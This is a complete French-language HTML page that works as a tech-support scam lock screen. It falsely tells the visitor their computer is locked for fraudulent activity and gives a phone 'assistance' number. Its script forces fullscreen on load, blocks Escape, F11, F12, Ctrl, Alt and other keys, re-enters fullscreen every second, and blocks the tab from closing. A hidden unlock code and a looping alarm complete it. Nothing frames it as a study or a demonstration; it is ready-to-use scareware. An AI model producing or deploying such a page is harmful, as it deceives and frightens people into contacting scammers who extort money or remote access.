<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔒 Sécurité Système</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        html, body {
            width: 100%;
            height: 100%;
            background: black;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden;
        }

        .container {
            background: red;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px white;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }

        #alert-message {
            font-size: 16px;
            margin-bottom: 20px;
        }

        input {
            padding: 10px;
            font-size: 16px;
            margin-bottom: 10px;
        }

        button {
            background: black;
            color: white;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }

        #error-message {
            color: yellow;
            font-size: 14px;
            margin-top: 10px;
        }
    </style>
</head>
<body onload="startLockdown()">
    <div class="container">
        <h1>🔴 ACCÈS BLOQUÉ 🔴</h1>
        <p id="alert-message">
            🚨 <b>SUSPICION D’ACTIVITÉ FRAUDULEUSE</b> 🚨<br>
            Votre ordinateur est verrouillé pour des raisons de **sécurité**.<br>
            Veuillez **entrer le code secret** pour déverrouiller.<br>
            <b>☎ Assistance : +44 741 30 52 610</b>
        </p>
        <input type="password" id="codeInput" placeholder="Entrez le code secret..." autofocus>
        <button onclick="checkCode()">Déverrouiller</button>
        <p id="error-message"></p>
    </div>

    <script>
        // 🔒 Codes secrets autorisés
        const SECRET_CODES = ["dakar", "2012", "1234"];
        let attempts = 0;
        const maxAttempts = 3;

        // 🚀 Démarrer le verrouillage
        function startLockdown() {
            requestFullScreen();  // Forcer le mode plein écran
            blockKeys();          // Désactiver certaines touches
            preventClose();       // Empêcher la fermeture de l'onglet
        }

        // 🔐 Vérifier le code
        function checkCode() {
            let inputCode = document.getElementById("codeInput").value.toLowerCase();
            
            if (SECRET_CODES.includes(inputCode)) {
                unlockSystem();
            } else {
                attempts++;
                document.getElementById("error-message").textContent = `⛔ Code incorrect (${attempts}/${maxAttempts})`;
                
                if (attempts >= maxAttempts) {
                    playAlarm();
                }
            }
        }

        // 🛑 Forcer le plein écran
        function requestFullScreen() {
            let elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.mozRequestFullScreen) { // Firefox
                elem.mozRequestFullScreen();
            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) { // IE / Edge
                elem.msRequestFullscreen();
            }
        }

        // 🚨 Bloquer certaines touches du clavier
        function blockKeys() {
            document.addEventListener("keydown", function (event) {
                let blockedKeys = ["F11", "Escape", "F5", "F12", "Tab", "Control", "Alt", "Meta"];
                
                if (blockedKeys.includes(event.key)) {
                    event.preventDefault();
                }
            });
        }

        // 🔊 Jouer une alarme après 3 erreurs
        function playAlarm() {
            let audio = new Audio("https://freesound.org/data/previews/411/411091_5121236-lq.mp3");
            audio.loop = true;
            audio.play();
        }

        // 🔓 Déverrouiller l'écran
        function unlockSystem() {
            document.exitFullscreen();
            document.body.innerHTML = "<h1 style='color: green;'>✅ Accès Rétabli</h1>";
        }

        // ❌ Empêcher la fermeture ou réduction de l'onglet
        function preventClose() {
            window.onbeforeunload = function() {
                return "🚨 Attention ! Cette action peut provoquer une perte de données.";
            };

            document.addEventListener("visibilitychange", function() {
                if (document.hidden) {
                    requestFullScreen(); // Remettre en plein écran si l'onglet est caché
                }
            });

            setInterval(() => {
                if (!document.fullscreenElement) {
                    requestFullScreen(); // Re-forcer le plein écran s'il est quitté
                }
            }, 1000);
        }
    </script>
</body>
</html>
